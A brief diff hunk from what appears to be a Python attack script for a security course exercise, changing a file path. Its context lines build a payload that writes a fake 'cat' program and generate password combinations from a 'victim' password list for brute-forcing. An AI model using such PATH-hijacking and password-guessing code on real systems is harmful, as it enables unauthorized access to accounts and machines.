@@ -65,7 +65,7 @@ if __name__ == "__main__":
     
     payload += " \"$1\";exit 0;\n' > cat"
 
-    passlist = open('materials/victim.dat').read().splitlines()
+    passlist = open('/home/csc2022/materials/victim.dat').read().splitlines()
     els = []
     for i in range(1, len(passlist)+1):
         els.extend([list(x) for x in itertools.combinations_with_replacement(passlist, i)])
